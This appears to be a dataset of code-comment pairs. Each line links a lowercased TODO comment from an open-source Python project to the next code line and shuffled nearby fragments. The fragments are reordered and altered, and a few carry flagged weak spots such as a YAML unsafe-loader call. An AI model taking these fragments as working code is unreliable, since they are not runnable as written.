# todo: time to say goodbye to the old mount namespace, see "man 2 unshare" to get some help </s> linux.mount('proc', os.path.join(new_root, 'proc'), 'proc', 0, '')	contain new_root = create_container_root(image_name, image_dir, container_id, container_dir) print('Created a new root fs for our container: {}'.format(new_root)) linux.mount('sysfs', os.path.join(new_root, 'sys'), 'sysfs', 0, '') linux.mount('tmpfs', os.path.join(new_root, 'dev'), 'tmpfs',
# todo pydocs </s> self.buffersize = arraysize	set_arraysize def set_arraysize(self, arraysize):
# todo: more efficient copy </s> for i in range(span):	str_arr_slice_impl n_chars = end_offset - start_offset new_arr = pre_alloc_string_array(span, np.int64(n_chars)) new_arr[i] = str_arr[slice_idx.start+i] return new_arr
# todo: remove this in v1.8. </s> if self.hpc_resume_path is not none:	restore_model model = self.trainer.lightning_module model.on_load_checkpoint(self._loaded_checkpoint) model.on_hpc_load(self._loaded_checkpoint) self.trainer.training_type_plugin.load_model_state_dict(self._loaded_checkpoint)
# todo replace all that with ssh-copy-id </s> server.append("mkdir -p ~/.ssh")	installKeys hostname = hostname.split('/')[0] server = utils.ScriptRunner(hostname) server.append("chmod 500 ~/.ssh") server.append("grep '%s' ~/.ssh/authorized_keys > /dev/null 2>&1 || echo %s >> ~/.ssh/authorized_keys"%(sshkeydata, sshkeydata))
# @todo: make drop-down list of options </s> crud_fields.append("physical_description.ethnicity")	customise_pr_person_controller ]) else: field = dtable.nationality VN = "VN"
writeable=is_writeable,      # everything is false for now, todo later </s> has_content=bool(channels),  # true if we found channels in it	handle_async id=drive.mountpoint, name=drive.mountpoint, channels=channels, )
# todo: check </s> self.projection_matrices = nn.embedding(num_relations, self.entity_embedding_dim * self.relation_embedding_dim)	__init__ self.entities_embeddings = nn.Embedding(num_entities, self.entity_embedding_dim) self.relation_embeddings = nn.Embedding(num_relations, self.entity_embedding_dim) self.margin_loss = margin_loss
status = 'published'  # todo: find a way for draft posts </s> yield (post_title, content, slugify(post_title), post_creadt, author,	dc2fields post_format = "html" kind = 'article'  # TODO: Recognise pages categories, tags, status, kind, post_format)
# todo: try removing the none checks after https://github.com/mozilla/rust-code-analysis/issues/528 is fixed. </s> if metrics["mi"]["mi_original"] is not none:	get_summary_metrics obj["nexits_max"] = max(obj["nexits_max"], metrics["nexits"]["sum"]) obj["cognitive_max"] = max(obj["cognitive_max"], metrics["cognitive"]["sum"]) obj["mi_original_max"] = max( obj["mi_original_max"], metrics["mi"]["mi_original"]
# todo: implement me </s> self.logmessage("%s %s" % (msg.__class__, vars(msg)), 4)	ChildDepth def ChildDepth(self, msg):
raise notimplementederror  # todo(mattjj) </s> def full_lower(self):	SplitTracer return core.get_aval(self.val) def unpack(self): if self.name is None: return core.full_lower(self.val)
# todo: unify with instagram, maybe in source.get_comment() </s> logging.debug('looking for comment in inline activity')	get_comment activity: activity object, optional. Avoids fetching the activity. if activity: tag_id = self.tag_uri(comment_id) for reply in activity.get('object', {}).get('replies', {}).get('items', []):
# if pycryptodomex is not available, we are done </s> if not _aes:	run_test func(*args, **kwargs) finally: return crypto.AES = _aes
gc.collect()  # todo: see first comment above </s> ok_(ds2 is not none)	test_Dataset_flyweight ok_(ds4.repo is ds1.repo) del ds1 ok_(ds2.repo is ds3.repo) if not on_windows:
#todo: code this </s> pass	setPartialMultiInSlot def setPartialMultiInSlot(self,multislot,slot,index, key,value):
# todo - fix meta.submission to point to real submission </s> self._remove_handled(self.submission.submission)	delete def delete(self, **kwargs): super(Metadata, self).delete(**kwargs)
# todo: house ad </s> promo_obj = none	get_promo break else: if gold_user: gold_promo = SupporterPromo.objects.filter(live=True,
# todo: make this more efficient </s> self._calc_seek(self._fake_seek)	read except IndexError: break  # EOF return b''.join(full_data)
# todo: log discarded bytes? </s> return 'request discarded due to invalid crc.'	decode_in self.in_parsing = False self.in_data = [] comm_address = self.in_data[1] if self.in_data[2] in self.request_command_map:
# todo store account here </s> self.group_sessions[room_id][session_id] = session	create_group_session session = InboundGroupSession(session_key)
# todo: should we check the arity? </s> new_template = element(template)	get_section parsed_template = self._parse(new_template, delimiters=delims) parts.append(parsed_template.render(context))
oldsize = self.size # todo: remove </s> assert type(self.body) in (str, list), '%s: %s' % (self.type, type(self.body))	Atom atom.write(stream) def calsize(self): if type(self.body) == str: pass
_, g_loss = self.trainable_gan.forward_loss()#todo targets=['d'] </s> else:	g_grads self.setup_gradient_flow(self.trainable_gan.g_parameters(), self.trainable_gan.d_parameters()) if d_fake is None: _, g_loss = self.trainable_gan.loss.forward(d_real, d_fake)#TODO targets=['d'] _, g_loss = self.trainable_gan.forward_loss()#TODO targets=['d']
# todo(b/181866850): enable tokenize_with_offsets when it works and test. </s> self.assertfalse(hasattr(preprocess, "tokenize_with_offsets"))	test_exported_callables vocab_size=4+6 if use_sp_model else 4+4)) if use_sp_model: else: token_ids, start_offsets, limit_offsets = (
# todo remove this paragraph, it's ugly and shouldn't be needed </s> inferred = self._name.infer()	goto_assignments if self._name.tree_name is None: return self if not inferred: return None
# todo: requires special treatment? </s> current_unit = line.variants[0].line[0]	hitbox_ability :rtype: ...dataformat.expected_pointer.ExpectedPointer if isinstance(line, GenieVillagerGroup): else: current_unit = line.line[0]
train_critic = tf.train.adamoptimizer(1e-4).minimize(vloss) # todo: parameterize </s> return tf.group(train_actor, train_critic)	train return tf.reduce_mean(tfl.kl(p1, p2)) train_actor = self.optimizer.optimize(actor_loss, actor_params, log_actor_probs, metric)
# todo(b/141575627): we handle complex-dtype sum-reduction directly as a </s> dtype_args = ([xops.real(x) for x in dtype_args] +	_allreduce_translation_rule n = len(dtype_args) if is_complex and prim is lax.add_p: [xops.Imag(x) for x in dtype_args]) scalar = ShapedArray((), c.get_shape(dtype_args[0]).numpy_dtype())
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> tokenrequest = util.setup_expected_client_cred_token_request_response(403)	test_http_error @httpretty.activate def test_http_error(self): context = AuthenticationContext(cp['authUrl']) def callback(err, tokenResponse):
# todo: remove this after 2.4 as the switch to using underscores is a breaking change </s> peer_interface_name = request.query_params.get('peer-interface')	list peer_interface_name = request.query_params.get(self._interface_param.name) if not peer_interface_name: if not peer_device_name or not peer_interface_name: raise MissingFilterException(detail='Request must include "peer_device" and "peer_interface" filters.')
# todo - this isn't actually the correct way to set the vary header, </s> response.headers['allow'] = ', '.join(self.allowed_methods)	dispatch except ErrorResponse, exc: response = exc.response response.headers['Vary'] = 'Authenticate, Accept' return self.render(response)
# todo: this is a hack -- document can't be converted to string </s> if hasattr(self, 'config'):	_parse data = yaml.load(text) or {} except yaml.scanner.ScannerError as exc:  # pylint: disable=E1101 path = getattr(self, 'config') else:
#todo: handle this exception </s> except exception as ex:	dbg_step_into except DieCallStackPushError as ex: self.logger.exception("Error while pushing function to call stack") self.logger.exception("failed while stepping into breakpoint: %s", ex) exit(1)
# todo: comment as to why this is </s> context = none	remove assert self.__open, "The InformationStore must be open." if context == self.identifier: cspo, cpos, cosp = self.__indicies index, prefix, to_key, from_key = self.__lookup((subject, predicate, object), context)
# todo find the correct hbin </s> d = hbincell(self._buf, offset, self.parent())	sk_record def sk_record(self): offset = self.abs_offset_from_hbin_offset(self.unpack_dword(0x2C)) return SKRecord(self._buf, d.data_offset(), d)
# todo: remove? </s> else:	to_instance ) return etree.tostring(root, encoding='utf-8', pretty_print=True) return requisition_case_xml(data, stock_blocks)
pass # todo </s> else:	SetBundleState pass # TODO elif auto_guess: newstate = Bundler.ALG_NAME # default self.Freeze()
# todo(jk0): this will eventually need to take ssl into consideration </s> generated_url = glance._construct_glance_url()	test_contruct_glance_url def test_contruct_glance_url(self): actual_url = "http://%s:%d" % (FLAGS.glance_host, FLAGS.glance_port) self.assertEqual(generated_url, actual_url)
# todo: can convert to @abstractmethod once subclasses handle it </s> raise notimplementederror('this function not yet implemented')	iter_documents def iter_documents(self, ids):
# todo: re-enable for hardware </s> for portno, config in list(interfaces_config.items()):	add_dp name, dp_config, port, interfaces_config, i, dpid_count, stack, n_tagged, tagged_vid, n_untagged, untagged_vid) stack = config.get('stack', None) if stack:
# todo: fix this </s> self.assertequal(dihedrals, self.forcefield.dihedrals)	test_ff_map self.assertEqual(tbonds, self.topology.bonds) self.assertEqual(angles, self.forcefield.angles)
#todo: add transaction cost here also </s> portfolio_value -= price	new_stage_data next_price = episodic_data.data_average_price(data_dict, new_state) if action == 1: portfolio += 1 elif action == 2:
# todo: accept ifs as a named arg?  split('a b', ifs=' ') </s> setglobalfunc(mem, 'split', splitter.splitfuncbuiltin)	Init2 def Init2(mem, splitter, globber): SetGlobalFunc(mem, 'glob', lambda s: globber.OilFuncCall(s))
# # fixme: # todo: remove me </s> try:	unpack_url url= 'http://{}'.format(url_lower_case) else: scheme = url_unpack['scheme'].decode() except Exception as e:
# todo: test me </s> return len(self.node.files_versions[self.clean_filename])	latest_version_number def latest_version_number(self):
# todo check that location is associated with this pipeline </s> return api.location(uri).get()	get_location_by_uri def get_location_by_uri(uri): api = _storage_api()
# todo: show in display_problems() </s> show_invalid_depstring_notice(pkg, dep_string, str(e))	_add_pkg_dep_string except portage.exception.InvalidDependString as e: if pkg.installed: return 1 raise
raise typeerror(msg.format(dtype))  # todo(mattjj, dougalm): handle complex </s> flat_basis = onp.eye(ndim, dtype=dtype)	_std_basis msg = ("Jacobian only defined for functions with floating input and output " "dtypes (i.e. dtypes that model real numbers), got {}.") return _unravel_array_into_pytree(pytree, 1, flat_basis)
# todo: change this file format to be plain yaml and use safeloader </s> yaml_options = yaml.load(open(filename), loader=yaml.unsafeloader)	_from_yaml def _from_yaml(self, filename): Overwrites any options that are specified in the yaml file. self._options.update(yaml_options)
# todo: hacked values for now </s> n_trees = 5 + int(round((x.shape[0]) ** 0.5 / 20.0))	nearest_neighbors rp_forest = [] else: n_iters = max(5, int(round(np.log2(X.shape[0])))) try:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_unexpected_parameters def test_fail_unexpected_parameters(self): Request contains unexpected parameters.
# todo: find a better solution for this? </s> run_command(["dvc", "config", "core.analytics", "false"])	project_init run_command(init_cmd) if not analytics: config = load_project_config(dest) with msg.loading("Updating DVC config..."):
# todo add write unlock </s> pass	write self.storage_writer.write(msg, callback) finally:
# todo need copy? </s> x = mesh.node_coords.copy()	quasi_newton_uniform2 def quasi_newton_uniform2(*args, **kwargs): def get_new_points(mesh): x += quasi_newton_update_relaxed_lloyd(mesh, omega=2.0) return x[mesh.is_interior_node]
print('warning: driver init returned none, {}'.format(ep.name))  # todo: use proper logger </s> return driver	safe_load return None if driver is None:
# todo: タイミング情報がとれるかをテストする </s> self.init_capture(source)	start_gst def start_gst(self, source):
# todo: test timezone-aware datetime.date </s> self.assertequal(datefield.type, datetime.date)	test_DateField def test_DateField(self): from rows.fields import DateField self.assertIs(type(DateField.deserialize('2015-05-27')), DateField.TYPE)
# todo: entropy loss </s> q = qs[i][0][actions[i]]	_train_on_policy log_prob = policies[i][0][actions[i]].log() policy_loss -= log_prob * A value_loss += (Qret - Q) ** 2 / 2  # Least squares loss Qret = Qret - Q.detach() + Vs[i].detach()
# todo(liuyuhui) only xpu broadcast parameters here. </s> if parallel_helper._is_data_parallel_mode(	_dygraph_call_func with program_desc_tracing_guard(False): self._build_once(*inputs, **kwargs) ) and paddle.is_compiled_with_xpu(): parallel_helper._broadcast_parameters(
# todo: put action definitions in a dict and loop here </s> action_mode = sum([	mainloop if not self.args: self.parser.error("No filter conditions given!") self.options.start, self.options.close,
# todo: handle multiple skip stacks </s> (skip, skip_stack), = skip_stack.items()	block_container_layout first_letter_style = getattr(box, 'first_letter_style', None) else: first_letter_style = None for index, child in enumerate(box.children[skip:], start=(skip or 0)):
# todo deprecated? </s> return urllib.parse.unquote(string)	unquote .. note:: This is a convenient shortcut for ``urllib.parse.unquote``.
# todo: move unset and set output in messages </s> self._assert_exec('echo 1', '1', log_captured)	test_session_proxy self._assert_exec('echo 1', messages.channels.error_proxy_format, log_captured) self._assert_exec(':unset proxy', 'proxy is now unset', log_captured) self._assert_exec(':set proxy http://127.0.0.1:12782', 'proxy = http://127.0.0.1:12782', log_captured) self._assert_exec('echo 1', messages.terminal.backdoor_unavailable, log_captured)
# no todo item selected </s> pass	_edit_selected_item str(self.view.todolist.number(todo)))) except AttributeError:
# todo: fix singlemachinebatchsystem to support this call </s> self.batchsystem.issuejob('sleep 1', memory=10, cpu=1)	testGetRunningJobsIDs def testGetRunningJobsIDs(self): self.batchSystem.issueJob('sleep 1', memory=10, cpu=1) self.wait_for_jobs()
# todo(b/163904067): mimic defun' behavior and reset the step seed to </s> resetstepseed()	Forward @tf.function(input_signature=Flatten(fwd_sig), autograph=False) def Forward(*args): with RemoveAssertContext(remove=noinline), tf.device(device): xs = Pack(fwd_sig, args)
# todo: where does this value come from? </s> del parameters["step_down"]	parse_yaml parameters["milling_style"] = milling_style_map[parameters["milling_style"]] del parameters["name"] del parameters["overlap"] del parameters["path_pattern"]
# todo: remove when botfactory can force everything to be unthreaded </s> time.sleep(0.1)	test_isup_command_ok irc.pm(user, '.isup example.com') while bot.running_triggers: assert len(bot.backend.message_sent) == 1, ( '.isup command should output exactly one line')
# todo: this needs refactoring </s> if table is not none:  # pragma: no cover	download_file_job if symlink_path is not None: full_symlink = os.path.join(symlink_path, filename) write_table_line(entry, table, local_file) return DownloadJob(full_url, local_file, expected_checksum, full_symlink)
# todo: look in other supported bumpversion config locations </s> bumpversion = none	configure_bumpversion def configure_bumpversion(project_settings): bumpversion_config_path = Path('.bumpversion.cfg') if not bumpversion_config_path.exists():
# todo: don't write them? is *much* slower on re-load (~3x) </s> try:	update_module fh.flush() os.fsync(fh.fileno())  # flush to disk os.unlink(self.module_path + 'c') except OSError:
# todo remove? </s> yield key_stmt[0].name, value_stmt	iterate yield call.name, value_stmt else: else: if stmt.assignment_details:
# todo untested </s> raise valueerror("unknown bio failure")	_handle_bio_errors else: 1/0 else: 1/0
# todo: use complete list of `order_by` fields </s> table.order_by(order_by[0].replace('^', '-'))	convert table.fields.keys(), permit_not=True) with rows.locale_context(output_locale): export_to_uri(destination, table, encoding=output_encoding)
# todo: remove when materialized paths are fixed in the payload returned from waterbutler </s> if not new_path.startswith('/'):	create_new_file else: new_path = obj.referent.materialized_path.replace(source['materialized'], destination['materialized']) new_path = '/' + new_path new_file = FileNode.resolve_class(destination['provider'], FileNode.FILE).get_or_create(destination_node, new_path)
# todo(andi) comment types should be unified, see related issue38 </s> token = tlist.token_next_by_instance(0, sql.comment)	_get_next_comment def _get_next_comment(self, tlist): if token is None: token = tlist.token_next_by_type(0, T.Comment)
# todo: use all of the followed objects as input to documentation. </s> definition = followed[0]._definition	documentation followed = self.follow_definition() if followed: return Documentation(definition)
# todo: requires special treatment? </s> current_unit = line.variants[0].line[0]	projectile_ability :rtype: ...dataformat.expected_pointer.ExpectedPointer if isinstance(line, GenieVillagerGroup): else: current_unit = line.line[0]
# todo: serialize properly </s> return self.ok(importers)	RepoImporters try: importers = importer_manager.get_importers(repo_id) except errors.MissingImporter: serialized = http_error_obj(404)
#todo: consider factoring out: some duplication between xliff and tmx </s> text = errorname + ': ' + errortext	adderror def adderror(self, errorname, errortext): self.addnote(text, origin="pofilter")
# todo(jheek): re-introduce this test when the tracer check is revived. </s> test.init(random.prngkey(0))	test_collection_store_fails_if_out_of_scope with self.assertRaisesRegex(ValueError, pattern):
# todo postremora replace the above with this line when remora goes away </s> user.confirmationcode = ''	confirm amo.utils.clear_messages(request) return http.HttpResponseRedirect(reverse('users.login') + '?m=5') user.save() messages.success(request, _('Successfully verified!'))
# todo: make this regex verbose </s> return re.sub(r"([^.])(\r?\n)((?:[a-z_])|(?:\d+[^\d.])|(?:\*\*+))",	unwarp >>> unwarp("list:\\n\\n- a\\n- b\\n") 'list:\\n\\n- a\\n- b' r"\1 \3", text, re.IGNORECASE).strip()
# todo only if handle </s> return self.handle.split("@")[0]	username_part @property def username_part(self):
# todo: deprecate `extra_info` in favor of `options` </s> if 'extra_info' in kwargs:	get_posts if 'pages' in kwargs: kwargs['page_limit'] = kwargs.pop('pages') kwargs.pop('extra_info') options.add('reactions')
# todo: see https://github.com/mozilla/openwpm/issues/867 for </s> service_args=["--marionette-port", str(marionette_port)],	deploy_firefox options=fo, log_path=interceptor.fifo, ) if browser_params.extension_enabled:
# todo perform error checking if the optimized clause is used. </s> if seen_optimized:	_retrieve_analyze_variables for v in variables ] if seen_variables: raise BQLError(bdb, 'OPTIMIZED incompatible with VARIABLES')
# todo: return should cause an 'exit 0' reply? </s> is_return, _ = self.cmd_ev.executeandcatch(node)	ECMD result = cast(parse_result__Node, UP_result) node = result.cmd return ''  # it's just 'OK '
# todo: move conversion to string to enhanced json handler and rather pass objects in trace.log() </s> trace.log(trace.storage_omit_store_error, {	run if storage and not Config.storage_readonly[task_name] \ and not StoragePool.set_error(node_args, flow_name, task_name, self.request.id, exc_info): 'flow_name': flow_name, 'node_args': node_args,
pass # todo </s> def handle_request(self, input):	handle_request
# todo: run this loop in parallel ! </s> for x in train_set:	_nag accelerated gradient. gc = self.grad_clip for param, vel in zip(self.params, velocities): v = param.get_value(borrow=True)
# todo(dcramer): this doesnt handle concurrency </s> if test.query.filter_by(build=build, group_sha=test.group_sha, label_sha=test.label_sha).first():	_sync_test_results else: raise ValueError('Invalid test result: %s' % (case['status'],)) continue db.session.add(test)
# todo get a fallback consumption rate based on product/facility type </s> return none	default_consumption def default_consumption(case):
x0 = np.zeros(self.cum_states[-1])  # todo: pre-allocate? </s> for sysidx in np.where(self.systems)[0]:	simulate )) return -1 sys = self.systems[sysidx] state_start = self.cum_states[sysidx]
# todo: get pytest's coverage plugin working, iirc it has issues? </s> runner = "coverage run --source=paramiko -m pytest"	test runner = "pytest" if coverage: env = dict(os.environ) if 'SSH_AUTH_SOCK' in env:
# todo: check that the birth date is not in the future </s> except valueerror, e:	is_valid try: birth_date = _get_birth_date(number) return False if len(number) == 10:
# todo (in luxcore): </s> prefix = "scene.textures."	_node luxcore_name = luxcore_name + "fac" elif node.bl_idname == "ShaderNodeMath": definitions = {} tex1 = _socket(node.inputs[0], props, obj_name, group_node)
# todo(mattjj): remove this special case, used for debugging on cpu </s> dims = c.getshape(x).dimensions()	shard_array def shard_array(shape, x): if xb.get_replica_count() == 1: return c.Reshape(x, None, dims[1:]) else:
# todo: set numpy setflags </s> return self._data[self._mask_domain]	data_ro_domain A read-only view of the domain data values. Elements are stored in row-major format.
#todo - should the default be gapped(single_letter_alphabet) instead? </s> def phylipiterator(handle, alphabet = single_letter_alphabet) :	PhylipIterator Record identifiers are limited to at most 10 characters. It only copes with interlaced phylip files!  Sequential files won't work
# todo not tested </s> _raise_current_error()	set_serial_number _api.BN_free(bignum_serial[0]) if asn1_serial == _api.NULL: set_result = _api.X509_set_serialNumber(self._x509, asn1_serial) if not set_result:
# todo: is there any way to divide up a single document into paragraphs? </s> documents.append([document])	read_data document.append(sentence) sentence = [] return documents
# todo: consider returning an empty () rather than raising </s> def should_raise():	test_empty assert_raises(AttributeError, keyed_tuple.keys) assert_raises(AttributeError, keyed_tuple._asdict) keyed_tuple._fields assert_raises(AttributeError, should_raise)
# todo: support aa </s> aa = []	get_slice po = ensure3d(self.po[x] if self.has_po else self.po) ah = [ensure3d(self.ah[i][x, y]) for i in range(len(self.ah))] return Activations(lh, po, ah, aa)
# todo: merge these </s> self.vxcage = args.vxcage or self.configp.has_option('maltrieve', 'vxcage')	__init__ os.rmdir(d) logging.info('Using {dir} as dump directory'.format(dir=self.dumpdir)) self.cuckoo = args.cuckoo or self.configp.has_option('Maltrieve', 'cuckoo') self.viper = args.viper or self.configp.has_option('Maltrieve', 'viper')
# todo present hw freq range </s> self.input_rate = input_rate = 3200000	__init__ gr.top_block.__init__(self, "SDR top block") self._running = False self.audio_rate = audio_rate =   32000 self.hw_freq = hw_freq = 98e6
# todo: do more stuff! </s> return d	_serialize_note 'model': note.model()['name'], }
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_empty def test_fail_empty(self):
# todo: multi dp route resolver needs to flood out stack ports </s> self.host_ping(v100_host, first_faucet_vip.ip)	verify_intervlan_routing self.add_host_route(v100_host, v200_host_ip, first_faucet_vip.ip) self.add_host_route(v200_host, v100_host_ip, second_faucet_vip.ip) self.host_ping(v200_host, second_faucet_vip.ip) self.host_ping(v100_host, v200_host_ip.ip)
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_tail pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
self.assertequals(self.todolist.count(), 1) # force won't delete subtasks </s> self.assertequals(self.output, "  2 bar p:1\nremoved: foo id:1\n")	test_del4 command.execute() self.assertTrue(self.todolist.is_dirty()) self.assertEquals(self.errors, "")
# todo: let the globe return the semimajor axis always. </s> a = np.float(self.globe.semimajor_axis or 6378137.0)	Stereographic coords += ([easting], [northing]) return coords b = np.float(self.globe.semiminor_axis or 6356752.3142) x_axis_offset = 5e7 / 6378137.
# todo: take care of nested resources </s> d = {}	to_dict def to_dict(self): for attr in self._wsme_attributes: attr_val = getattr(self, attr.name)
# todo: value check </s> self._target_world = target_world	__init__ if not isinstance(target_world, int): raise TypeError('target_world must be of type: int') if not isinstance(target_level, int): raise TypeError('target_level must be of type: int')
svg = apply_template(svg, {"maxpoints":maxpoints, "trdn": trdn, "msg":"", "valuemid":"0.5", "timemid":"10s", "datapoints":"","init_max_y": "false", "max_y": 0, "seconds_scale":0, "y_shift": 0}) # todo templating engine </s> if width and height: svg = svg.replace('height="210" width="610"', 'height="%s" width="%s"' % (height, width)) # todo: switch to templating	plotwh svg = apply_template(svg, {"MAXPOINTS":MAXPOINTS, "TRDN": trdn, "MSG":"", "VALUEMID":"0.5", "TIMEMID":"10s", "DATAPOINTS":"","INIT_MAX_Y": "false", "MAX_Y": 0, "SECONDS_SCALE":0, "Y_SHIFT": 0}) # TODO templating engine else: image_views += 1 return flask.Response(svg,  mimetype= 'image/svg+xml', headers={'Cache-Control': 'no-cache, no-store, must-revalidate', 'Pragma': 'no-cache'})
# todo: rethink default remote/tracking branch. see above. </s> cmd_list = ["git", "pull"]	__call__ if merge: lgr.info("Applying changes from tracking branch...") if name: cmd_list.append(name)
#todo: add type hints </s> markers = [	_filter_markers def _filter_markers(self, markers): m for m in markers
# todo(leofang): how about ptds? </s> if self.stream is none or self.stream is cuda.stream.null:	test_stream a = testing.shaped_arange((2, 3, 4), cupy, dtype) func = 'cupy.cuda.ExternalStream.synchronize' times = 0 else:
# todo: get rid of the wrapping dict, see #24568 </s> for image in g_client.images.list():	image_list g_client = _auth(profile) ret = {} ret[image.name] = { 'id': image.id,
# todo: to be implemented </s> raise notimplementederror()	stop _stop_batch_ce(ce_name=ce_name) elif cluster_section.get_param_value("scheduler") == "slurm": else: LOGGER.info("Stopping compute fleet: %s", args.cluster_name)
assert study_id == 0  # todo </s> self.trials[trial_id].system_attrs[attr_name] = attr_value	set_trial_system_attr def set_trial_system_attr(self, study_id, trial_id, attr_name, attr_value):
1  # todo: fill in identifier </s> )	test__if_updater_made_mistake AB_Transfer1 = channelAB.create_directtransfer( transfer_amount, AB_Transfer1.sign(privatekeyA, addressA) channelAB.register_transfer(AB_Transfer1)
assert self.restart_seq is none #todo: better handling of this situation </s> l.debug("initializing stop sequence")	stop_program assert self.start_seq is None #TODO: Better handling of this situation assert self.stop_seq is None #TODO: Better handling of this situation self.stop_seq = sequence_controller() for p in self.roaster:
# todo: warn/error: check if this var has units: assigning </s> if type(val) not in native_numeric_types:	set_value then the validation step is skipped. if not valid and val is not None: if self.parent_component()._units is not None: _src_magnitude = value(val)
# todo: decide wtf to do here </s> return false	mindtouch_create_user return False except HTTPError:
# todo account for all packages - this ignores the ones with different </s> versioned_packages = [	_perform_download_packages_from_repository from admin.packaging import package_filename, PackageTypes rpm_version = make_rpm_version(intent.version) package_filename(package_type=PackageTypes.RPM, package=package,
# todo: remove when we stop supporting python < 3.5 </s> if sys.version_info.major < 3 or sys.version_info.minor < 5:	transform X_embedded : `numpy.ndarray`, shape=(n_samples, n_components) The embedded data points. check_is_fitted(self, ['preprocessor_', 'components_']) else:
# todo: make keys get passed through files or environment </s> inbuf = tempfile.namedtemporaryfile()	encrypt def encrypt(self, data, key): inbuf.write(data) inbuf.flush()
# todo: remove hardcoded http </s> protocol = 'http'	send_campaign_email_subscriber 'campaign_uuid': email.campaign.uuid }) unsubscribe_absolute_url = '%s://%s%s' % (protocol, site.domain, path) context = {
# todo: check if we can get values for "importados/indefinidos" </s> self.add_city_case(city="importados/indefinidos", confirmed=none, deaths=none)	parse_csv total_confirmed += confirmed total_deaths += deaths self.add_state_case(confirmed=total_confirmed, deaths=total_deaths)
# todo: constants file for "broadcast" </s> pub_sock.send('broadcast', flags=zmq.sndmore)	Publisher pub_sock.send(payload) else: pub_sock.send(payload) else:
# todo: also preserve __module__, __name__ and a few other important attrs </s> funcname, filename, lineno, duration)	new_fn print >> sys.stderr, "\n  %s (%s:%s):\n    %.3f seconds\n" % (
#todo: implement extra options </s> py_options = self.check_options(options)	apply_m def apply_m(self, name, n, types, m, evaluation, options): 'ReadList[InputStream[name_, n_], types_, m_, OptionsPattern[ReadList]]' record_separators = py_options['RecordSeparators'] word_separators = py_options['WordSeparators']
# todo: an ir for ${} might simplify these lengthy conditions </s> if (tmp and tmp.tag_() == suffix_op_e.nullary and	_EvalBracketOp else: tmp = part.suffix_op cast(Token, tmp).id == Id.VOp0_a): pass
# todo data should be bytes only </s> return base64.b64decode(self.data).decode()	reveal def reveal(self):
# todo: python 2.4, 2.5 don't have io.bufferedreader!!! </s> in_file = gzip.gzipfile(input_file, 'r')	split_one compress = is_gzip(input_file) if compress: else: in_file = open(input_file, 'rt')
# xxx todo </s> return address, size	input_address_range size    = None
#todo: io plugins should assign default image formats </s> basename, ext = os.path.splitext(filename)	save_file_dialog if len(filename) == 0: return None if not ext: filename = '%s.%s' % (filename, default_format)
#todo: this is just for backwards compatibility. it should be removed in v0.98 with p2.6 </s> formatters = cls._create_formatters(cp)	configFromFile formatters = logging.config._create_formatters(cp) except: logging._acquireLock() try:
# todo: what if we fail?  error-handling should be recorded someplace, </s> yield workitem.delete()	actuallyReallyExecuteWorkHere workItemClass = WorkItem.forTable(table) workItem = yield workItemClass.load(workID) yield workItem.doWork() returnValue({})
# todo: verify learning rule contents </s> self.asserttrue(fib_route_replies)	test_host_ipv6_fib_route 'ipv6_dst': 'fc00::1:4', 'echo_request_data': bytes('A'*8, encoding='UTF-8')}) self.assertFalse(self.packet_outs_from_flows(fib_route_replies))
# todo: need to make sure the `rootvars dict` </s> if six.py3:	do_eval u"self": context, u"runtime": runtime} rootvars = bytes2str_in_dicts(rootvars)  # type: ignore if needs_parsing(ex):
# todo: make test method </s> ssl             # missing ssl extension?	test_ssl def test_ssl(): import ssl return True
# '-rs',  # @todo: manually remove dependencies of conflicting packages, </s> '-r',	_remove_conflicting_packages 'sudo', 'pacman', '--noconfirm', '--nodeps',
# todo: waiting for a fix: https://developer.blender.org/t53509 </s> mat = context.object	draw split.separator() if mat: layout.label("Material Nodes:") layout.template_ID(mat.luxcore, "node_tree", new="luxcore.mat_nodetree_new")
# todo remove arch dependent code </s> target_oprnd = asm_instruction.operands[0]	extract_branch_target def extract_branch_target(asm_instruction): address = None if isinstance(target_oprnd, X86ImmediateOperand) or \ isinstance(target_oprnd, ArmImmediateOperand):
if self._ndim == 3: # todo: use hasz </s> array = c_double * 3	ctypes @property def ctypes(self): return array(self.x, self.y, self.z) else:
# todo remove arch dependent code </s> target_oprnd = asm.operands[0]	_extract_call_target def _extract_call_target(self, asm): address = None if isinstance(target_oprnd, X86ImmediateOperand) or \ isinstance(target_oprnd, ArmImmediateOperand):
# todo: add keep parameter </s> return self._rank(method, ascending)	rank Name: b, dtype: float64
# todo use properties here to infer mechanism and purview from </s> return mip(direction=direction,	_null_mip def _null_mip(direction, mechanism, purview): mechanism=mechanism, purview=purview,
# steps = 0 # todo </s> print("dupli export took %.3fs" % (time() - start))	convert transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations)
accept_federated_only=self.federated_only)  # todo: 466 </s> self.remember_node(seed_node)	__attempt_bootnode_learning seed_node = self.network_middleware.learn_from_seednode(seednode_metadata=bootnode, timeout=timeout, except RuntimeError: if current_attempt == retry_attempts:
# todo: implement me </s> self.logmessage("%s %s" % (msg.__class__, vars(msg)), 4)	DistribChildDepth def DistribChildDepth(self, msg):
# todo: other "expected" error types to catch? </s> except pywikibot.error as edit_err:	handle try: func(self, *args, **kwargs) err = edit_err  # edit_err will be deleted in the end of the scope link = self.title(as_link=True)
# todo: rewise once row_limit is working </s> simbad.timeout = 100	test_query_region def test_query_region(self, temp_dir): simbad = Simbad() simbad.cache_location = temp_dir result = simbad.query_region(ICRS_COORDS_M42, radius=2 * u.deg,
# todo - this should be replaced by official repo when </s> if base_url:	task_install_cli "apt-get", "-y", "install", "software-properties-common"]), ] commands.append(run_from_args([ "add-apt-repository", "-y", "deb {} /".format(base_url)]))
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_convert = p_operation.add_parser( "convert", help="convert VGM to PCM using OPL hardware")
# todo: handle boolean overrides </s> )	ursula rest_port=rest_port, db_filepath=db_filepath, try:  # Unlock Keyring if not quiet:
# todo: update once lakshmi's pr is merged </s> packs_base_path = '/opt/stackstorm'	run pack = self.action.pack if self.action else None serialized_parameters = json.dumps(action_parameters) if action_parameters else '' virtualenv_path = os.path.join(packs_base_path, 'virtualenvs/', pack) python_path = os.path.join(virtualenv_path, 'bin/python')
